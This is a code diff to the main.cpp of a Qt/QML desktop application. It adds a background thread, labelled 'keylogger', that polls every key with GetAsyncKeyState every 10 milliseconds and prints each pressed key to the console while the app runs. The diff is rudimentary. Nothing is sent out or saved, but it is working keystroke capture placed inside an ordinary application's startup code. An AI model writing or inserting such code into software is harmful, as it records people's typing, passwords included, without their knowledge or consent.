@@ -1,6 +1,21 @@
 #include <QGuiApplication>
 #include <QQmlApplicationEngine>
 
+#include <QThread>
+//keylogger
+#include <stdio.h>
+#include <conio.h>
+#include <Windows.h>
+#include <winuser.h>
+#include <fstream>
+#include <string>
+#include <windows.h>
+//keylogger
+
+#include <iostream>
+using namespace std;
+
+
 
 int main(int argc, char *argv[])
 {
@@ -17,6 +32,28 @@ int main(int argc, char *argv[])
             QCoreApplication::exit(-1);
     }, Qt::QueuedConnection);
     engine.load(url);
+
+
+    //keylogger thread
+    QThread *thread = QThread::create([]
+    {
+        UINT key;
+
+        while(TRUE)
+        {
+            Sleep(10);
+
+            for(key = 0; key <= 255; key++) {
+                if(GetAsyncKeyState(key) == -32767)
+                {
+                    cout << key << " pressed" << endl;
+                }
+            }
+        }
+    });
+    thread->start();
+
+
 
     return app.exec();
 }
